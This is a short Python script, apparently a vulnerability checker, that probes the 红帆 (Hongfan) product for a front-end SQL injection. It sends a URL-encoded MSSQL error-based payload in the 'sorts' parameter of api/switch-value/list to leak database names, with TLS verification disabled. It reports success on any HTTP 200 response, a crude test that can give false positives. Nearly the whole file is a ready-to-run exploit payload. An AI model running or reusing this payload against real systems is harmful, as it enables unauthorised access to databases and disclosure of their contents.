import time

import requests
import urllib3


def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(url):
    target_url = url + "api/switch-value/list?sorts=%5B%7B%22Field%22:%22convert(int,stuff((select%20quotename(name)%20from%20sys.databases%20for%20xml%20path(%27%27),1,0,%27%27))%22%7D%5D&conditions=%5B%5D&_ZQA_ID=4dc296c5c89905a7)"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
    print(now_time() + " [INFO]     正在检测红帆_Sql漏洞")
    try:
        urllib3.disable_warnings()
        res = requests.get(url=target_url, headers=headers, verify=False, timeout=10)
        if res.status_code == 200:
            print(now_time() + " [SUCCESS]     存在红帆前台SQL注入:{}".format(target_url))
        else:
            print(now_time() + " [WARNING]  不存在前台SQL注入")
    except Exception as e:
        print(now_time() + " [ERROR]    目标请求失败 ")
